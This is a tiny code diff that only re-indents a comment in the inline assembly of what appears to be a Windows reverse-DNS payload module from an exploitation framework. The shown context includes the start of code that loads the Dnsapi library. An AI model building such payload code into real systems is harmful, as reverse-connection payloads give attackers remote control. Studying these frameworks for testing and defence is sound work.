@@ -101,7 +101,7 @@ module Payload::Windows::ReverseDns
     reliable     = opts[:reliable]
     
     asm = %Q^
-      ; Input: EBP must be the address of 'api_call'.
+         ; Input: EBP must be the address of 'api_call'.
          
          ;;;;;;;;; Load DNS API lib ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
          push        'pi'               ; Push the bytes 'Dnsapi',0,0 onto the stack.
